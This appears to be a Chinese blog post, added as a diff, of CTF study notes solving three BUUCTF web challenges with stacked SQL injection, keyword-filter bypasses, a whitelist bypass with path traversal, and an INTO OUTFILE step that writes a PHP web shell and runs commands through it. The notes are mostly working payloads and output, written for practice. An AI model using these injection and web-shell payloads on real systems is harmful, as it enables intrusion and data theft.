@@ -1,0 +1,473 @@
+---
+title: "BORBER CTF 第一周 学习笔记"
+gitinfo: true
+share: true
+comments: true
+slug: "ctf_week1"
+images: ["https://cdn.jsdelivr.net/gh/Borber/PublicPic1/headImg/head.png"] 
+description: "学习总是累的"
+tags: ["WEB安全", "CTF"]
+date: 2020-07-20T10:18:04+08:00
+---
+
+# BORBER CTF 第一周 学习笔记
+
+
+
+### 任务一 [强网杯 2019 随便注 1](https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8)
+
+参考教程: [简简的我](https://www.jianshu.com/p/36f0772f5ce8)
+
+#### 方法一
+
+1. 判断是否存在注入，注入是字符型还是数字型
+
+   输入 `1’` 发现不回显
+
+   输入`1' #`显示正常  [^1]
+
+   ```javascript
+   array(2) {
+     [0]=>
+     string(1) "1"
+     [1]=>
+     string(7) "hahahah"
+   }
+   ```
+
+   
+
+   应该是存在sql注入了
+
+   输入`1' or '1'='1`,正常回显，应该是字符型
+
+   ```javascript
+   array(2) {
+     [0]=>
+     string(1) "1"
+     [1]=>
+     string(7) "hahahah"
+   }
+   
+   array(2) {
+     [0]=>
+     string(1) "2"
+     [1]=>
+     string(12) "miaomiaomiao"
+   }
+   
+   array(2) {
+     [0]=>
+     string(6) "114514"
+     [1]=>
+     string(2) "ys"
+   }
+   ```
+
+   后输入 `2` `114514` 发现均返回了对应的 数据 此处推断 sql查询所有条目到的均会返回
+
+   
+
+2. 猜解SQL查询语句中的字段数
+
+   输入`1' order by 1 #` 成功回显
+
+   到 `1' order by 3 #` 回显失败
+
+   可知字段为 2 
+
+   
+
+3. 显示字段
+
+   输入`1′ union select 1,2 #` 回显一个正则过滤规则
+
+   ```javascript
+   return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
+   ```
+
+   过滤了 select，update，delete，drop，insert，where 和 点
+
+   过滤了这么多词，是不是有堆叠注入？尝试堆叠注入 [^2]
+
+4. 查询数据库
+
+   输入`1';show databases;#` 成功回显
+
+   ```javascript
+   array(2) {
+     [0]=>
+     string(1) "1"
+     [1]=>
+     string(7) "hahahah"
+   }
+   
+   array(1) {
+     [0]=>
+     string(11) "ctftraining"
+   }
+   
+   array(1) {
+     [0]=>
+     string(18) "information_schema"
+   }
+   
+   array(1) {
+     [0]=>
+     string(5) "mysql"
+   }
+   
+   array(1) {
+     [0]=>
+     string(18) "performance_schema"
+   }
+   
+   array(1) {
+     [0]=>
+     string(9) "supersqli"
+   }
+   
+   array(1) {
+     [0]=>
+     string(4) "test"
+   }
+   
+   
+   ```
+
+   说明存在堆叠注入
+
+5. 查询表
+
+   输入`1';show tables;#` 成功回显
+
+   ```javascript
+   array(2) {
+     [0]=>
+     string(1) "1"
+     [1]=>
+     string(7) "hahahah"
+   }
+   
+   array(1) {
+     [0]=>
+     string(16) "1919810931114514"
+   }
+   
+   array(1) {
+     [0]=>
+     string(5) "words"
+   }
+   
+   
+   ```
+
+   可以看到有两张表 **1919810931114514**  **words** 
+
+6. 查询表中字段
+
+   **坑点：mysql中点引号( ' )和反勾号( ` )的区别**
+
+   ```shell
+   linux下不区分，windows下区分
+   区别:
+   单引号( ' )或双引号主要用于字符串的引用符号
+   eg：mysql> SELECT 'hello', "hello" ;
+   
+   反勾号( ` )主要用于数据库、表、索引、列和别名用的引用符是[Esc下面的键]
+   eg:`mysql>SELECT * FROM   `table`   WHERE `from` = 'abc' ;
+   ```
+
+   输入
+
+   ```sql
+   1'; show columns from `words`; #
+   ```
+
+    字段使用的是反勾号（ ` ）
+
+   ```javascript
+   array(6) {
+     [0]=>
+     string(2) "id"
+     [1]=>
+     string(7) "int(10)"
+     [2]=>
+     string(2) "NO"
+     [3]=>
+     string(0) ""
+     [4]=>
+     NULL
+     [5]=>
+     string(0) ""
+   }
+   
+   array(6) {
+     [0]=>
+     string(4) "data"
+     [1]=>
+     string(11) "varchar(20)"
+     [2]=>
+     string(2) "NO"
+     [3]=>
+     string(0) ""
+     [4]=>
+     NULL
+     [5]=>
+     string(0) ""
+   }
+   
+   ```
+
+   输入
+
+   ```sql
+   1'; show columns from `1919810931114514`; #
+   ```
+
+    字段使用的是反勾号（ ` ）
+
+   ```javascript
+   array(6) {
+     [0]=>
+     string(4) "flag"
+     [1]=>
+     string(12) "varchar(100)"
+     [2]=>
+     string(2) "NO"
+     [3]=>
+     string(0) ""
+     [4]=>
+     NULL
+     [5]=>
+     string(0) ""
+   }
+   ```
+
+   可以看到`1919810931114514`中有我们想要的`flag`字段
+
+   
+
+   **==突破点==**
+
+    
+
+   **他既然没过滤 alert 和 rename，那么我们是不是可以把表改个名字，再给列改个名字呢。
+    先把 words 改名为 words1，再把这个数字表改名为 words，然后把新的 words 里的 flag 列改为 id （避免一开始无法查询）。**
+
+   ```sql
+   1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#
+   ```
+
+   运行完这个 表的结构就改好了 下一步就是永真查询 (参考文章中 他这一步写错了)
+
+   ```sql
+   1' or '1'='1’ #
+   
+   或者 
+   
+   1' or '1'='1
+   ```
+
+   返回值
+
+   ```
+   array(1) {
+     [0]=>
+     string(42) "flag{bb0b5e1e-d7e6-4ed1-8b53-5a1540d0bff8}"
+   }
+   ```
+
+   
+
+#### 方法二：预处理语句+堆叠注入
+
+预处理语句使用方式：
+
+```sql
+PREPARE name from '[my sql sequece]';   //预定义SQL语句
+EXECUTE name;  //执行预定义SQL语句
+(DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL语句
+```
+
+预定义语句也可以通过变量进行传递:
+
+```sql
+SET @tn = 'hahaha';  //存储表名
+SET @sql = concat('select * from ', @tn);  //存储SQL语句
+PREPARE name from @sql;   //预定义SQL语句
+EXECUTE name;  //执行预定义SQL语句
+(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句
+```
+
+本题即可利用`char()`方法将`ASCII码`转换为`SELECT`字符串，接着利用`concat()`方法进行拼接获得查询的`SQL语句`，来绕过过滤或者直接使用`concat()`方法绕过
+
+```sql
+char（）根据ASCII表返回给定整数值的字符值
+eg:
+mysql> SELECT CHAR(77,121,83,81,'76');
+-> 'MySQL'
+
+contact（）函数用于将多个字符串连接成一个字符串
+contact (str1,str2,…) 
+eg:
+mysql> SELECT CONCAT('My', 'S', 'QL');
+-> 'MySQL'
+char(115,101,108,101,99,116)<----->'select'
+```
+
+**payload1：**不使用变量
+
+```sql
+1';PREPARE jwt from concat(char(115,101,108,101,99,116), ' * from `1919810931114514` ');EXECUTE jwt;#
+```
+
+```javascript
+array(1) {
+  [0]=>
+  string(42) "flag{52aec6f8-042b-4208-9e4e-7388542b3a88}"
+}
+
+```
+
+**payload2：**使用变量
+
+```sql
+1';SET @sql=concat(char(115,101,108,101,99,116),'* from `1919810931114514`');PREPARE jwt from @sql;EXECUTE jwt;#
+```
+
+```javascript
+array(1) {
+  [0]=>
+  string(42) "flag{52aec6f8-042b-4208-9e4e-7388542b3a88}"
+}
+```
+
+**payload3：**只是用contact(),不使用char()
+
+```sql
+1';PREPARE jwt from concat('s','elect', ' * from `1919810931114514` ');EXECUTE jwt;#
+```
+
+```javascript
+array(1) {
+  [0]=>
+  string(42) "flag{52aec6f8-042b-4208-9e4e-7388542b3a88}"
+}
+```
+
+#### 方法三 利用命令执行Getflag
+
+```sql
+1';Set @sql=concat("s","elect '<?php @print_r(`$_GET[1]`);?>' into outfile '/var/www/html/1",char(46),"php'");PREPARE sqla from @sql;EXECUTE sqla;
+```
+
+ 利用`char(46)`<==>`.`从而绕过关键词`.`过滤往 /var/www/html/ 目录里面写入一个 1.php文件 代码就是 
+
+```php
+<?php @print_r(`$_GET[1]`);?>
+```
+
+> Mysql into outfile语句，可以方便导出表格的数据。同样也可以生成某些文件。因此有些人会利用sql注入生成特定代码的文件，然后执行这些文件。将会造成严重的后果。Mysql into outfile 生成PHP文件 
+>
+> SELECT 0x3C3F7068702073797374656D28245F524551554553545B636D645D293B3F3E into outfile '/var/www/html/fuck.php'最后会在/var/www/html/路径下， 生成fuck.php文件这里不走寻常路，执行打算利用我们的shell查询flag（账号密码直接读取首页就可以看到）
+
+```sql
+/1.php?1=mysql -uroot -proot -e "use supersqli;select flag from \`1919810931114514\`;"
+```
+
+
+
+## 任务二 [HCTF 2018 WarmUp 1](https://buuoj.cn/challenges#[HCTF%202018]WarmUp)
+
+```php
+<?php
+    highlight_file(__FILE__);
+    class emmm
+    {
+        public static function checkFile(&$page)
+        {
+            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
+            if (! isset($page) || !is_string($page)) {
+                echo "you can't see it";
+                return false;
+            }
+
+            if (in_array($page, $whitelist)) {
+                return true;
+            }
+
+            $_page = mb_substr(
+                $page,
+                0,
+                mb_strpos($page . '?', '?')
+            );
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+
+            $_page = urldecode($page);
+            
+            //重点
+            $_page = mb_substr(
+                $_page,
+                0,
+                mb_strpos($_page . '?', '?')
+            );
+            //重点
+            
+            
+            if (in_array($_page, $whitelist)) {
+                return true;
+            }
+            echo "you can't see it";
+            return false;
+        }
+    }
+
+    if (! empty($_REQUEST['file'])
+        && is_string($_REQUEST['file'])
+        && emmm::checkFile($_REQUEST['file'])
+    ) {
+        include $_REQUEST['file'];
+        exit;
+    } else {
+        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
+    }  
+?>
+
+```
+
+原理: 字符串 -> 加上 “?” -> 截取 从开始到 第一个出现 “?” 作为名字 变量 -> 检查时候在白名单中 -> 返回true
+
+hook : 字符串 先加上 在白名单之后先加上 “?” -> 截取的一定是 白名单中的 -> 利用 / 使得 `hint.php?` 变为不存在的目录 最后include利用../../跳转目录读取flag [^3]
+
+
+
+## 任务三 [SUCTF 2019EasySQL1](https://buuoj.cn/challenges#[SUCTF%202019]EasySQL)
+
+- 堆叠注入
+- set sql_mode=PIPES_AS_CONCAT;将||视为字符串的连接操作符而非或运算符
+- 没有过滤*的时候可以直接注入
+
+解法1
+
+```sql
+*,1
+```
+
+解法2
+
+```sql
+1;set sql_mode=PIPES_AS_CONCAT;select 1
+```
+
+解析思路参照 [The Chen's repository](https://www.cnblogs.com/peri0d/)
+
+
+
+
+
+[^1]: 此处 # 作用是注释 忽略 # 之后的语句 [参考资料](https://blog.csdn.net/github_36032947/article/details/78442189) 
+[^2]: 这句话的逻辑 不是特别清楚 网上搜了很多 但是都是这一道题目的 没有讲具体的逻辑 目前推断是 能堆叠 防止你乱搞 所以才禁止了这些关键词 否则直接禁止了堆叠注入 就根本不用禁止了 而且此时是联合注入
+[^3]: ../ 是跳转到上级目录
